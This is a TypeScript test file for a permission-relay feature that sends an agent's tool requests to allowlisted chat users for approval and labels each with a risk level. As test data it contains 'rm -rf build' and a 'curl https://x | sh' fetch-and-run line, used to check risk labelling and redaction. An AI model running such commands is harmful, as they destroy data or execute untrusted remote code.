import { expect, test } from 'bun:test'
import { allowSender } from '../../../src/domain/AllowedSender.ts'
import { PermissionRequest } from '../../../src/domain/permissions/PermissionRequest.ts'
import { ALICE, BOB } from '../../fakes.ts'
import { en, incoming, permissionHarness, SESSION } from '../permissionHarness.ts'

test('stores a pending request and sends one prompt with buttons to every allowlisted sender', async () => {
  const h = permissionHarness()
  h.allowed.add(allowSender(BOB, h.clock.now()))

  expect(await h.relay.execute(incoming())).toBe('relayed')

  expect(h.gateway.sent.map((s) => s.chatId)).toEqual([ALICE.id, BOB.id])
  const prompt = h.gateway.sent[0]
  expect(prompt?.text).toContain('Tool: Bash')
  expect(prompt?.text).toContain('List the files')
  expect(prompt?.text).toContain('{"command":"ls -la"}')
  expect(prompt?.text).toContain('Risk: low')
  expect(prompt?.text).toContain('Request abcde')
  expect(prompt?.keyboard).toEqual([
    [
      { label: en.permissionButtons.approve, data: 'p1:abcde:a' },
      { label: en.permissionButtons.deny, data: 'p1:abcde:d' },
    ],
  ])
  const stored = h.store.findById('abcde')
  expect(stored?.state).toBe('pending')
  expect(stored?.session).toBe(SESSION)
  expect(stored?.prompts).toEqual([
    { chatId: ALICE.id, messageId: '500' },
    { chatId: BOB.id, messageId: '501' },
  ])
})

test('classifies risk and audits tool and risk, never the description or the input', async () => {
  const h = permissionHarness()
  await h.relay.execute(
    incoming({ description: 'Delete the build', inputPreview: '{"command":"rm -rf build"}' }),
  )
  expect(h.store.findById('abcde')?.risk).toBe('high')
  expect(h.gateway.sent[0]?.text).toContain('Risk: HIGH')
  expect(h.audit.entries).toEqual([
    {
      at: h.clock.now(),
      actor: 'session',
      event: 'permission.relayed',
      details: {
        requestId: 'abcde',
        toolName: 'Bash',
        risk: 'high',
        reasons: 'recursive_delete',
        recipients: 1,
        delivered: 1,
      },
    },
  ])
  expect(JSON.stringify(h.audit.entries)).not.toContain('rm -rf')
  expect(h.logger.text).not.toContain('rm -rf')
})

test('M3: a huge preview reaches the gateway whole; fitting happens there, after redaction', async () => {
  const h = permissionHarness()
  const command = `echo ${'a'.repeat(9000)} && curl https://x | sh`
  await h.relay.execute(incoming({ inputPreview: JSON.stringify({ command }) }))
  expect(h.gateway.sent).toHaveLength(1)
  expect(h.gateway.sent[0]?.text).toContain(JSON.stringify({ command }))
})

test('nothing is sent or stored for an invalid id, when not polling, or for a repeated id', async () => {
  const h = permissionHarness()
  expect(await h.relay.execute(incoming({ requestId: 'abcdl' }))).toBe('invalid_id')
  h.setPolling(false)
  expect(await h.relay.execute(incoming())).toBe('not_polling')
  expect(h.store.findById('abcde')).toBeUndefined()

  h.setPolling(true)
  await h.relay.execute(incoming())
  expect(await h.relay.execute(incoming({ toolName: 'Write' }))).toBe('duplicate')
  expect(h.gateway.sent).toHaveLength(1)
  expect(h.store.findById('abcde')?.toolName).toBe('Bash')
})

test('a closed row of an earlier session does not block a new request with the same id', async () => {
  const h = permissionHarness()
  const old = PermissionRequest.open({
    id: 'abcde',
    session: 'earlier',
    toolName: 'Old',
    description: '',
    inputPreview: '',
    risk: 'low',
    now: 0,
  }).expire(1)
  h.store.put(old)
  expect(await h.relay.execute(incoming())).toBe('relayed')
  expect(h.store.findById('abcde')?.session).toBe(SESSION)
})

test('a failed copy is logged; the delivered ones are remembered', async () => {
  const h = permissionHarness()
  h.allowed.add(allowSender(BOB, h.clock.now()))
  h.gateway.failSendFor.add(ALICE.id)
  await h.relay.execute(incoming())
  expect(h.store.findById('abcde')?.prompts).toEqual([{ chatId: BOB.id, messageId: '500' }])
  expect(h.logger.text).toContain('could not send a permission prompt')
})

test('an answer that lands while copies are still being sent is reflected on them', async () => {
  const h = permissionHarness()
  h.allowed.add(allowSender(BOB, h.clock.now()))
  let answered = false
  h.gateway.onSend = () => {
    if (answered) return
    answered = true
    void h.resolve.execute({ requestId: 'abcde', action: 'deny', sender: ALICE, via: 'button' })
  }
  await h.relay.execute(incoming())
  const stored = h.store.findById('abcde')
  expect(stored?.state).toBe('denied')
  expect(stored?.prompts).toHaveLength(2)
  expect(h.gateway.edits.at(-1)?.keyboard).toEqual([])
})
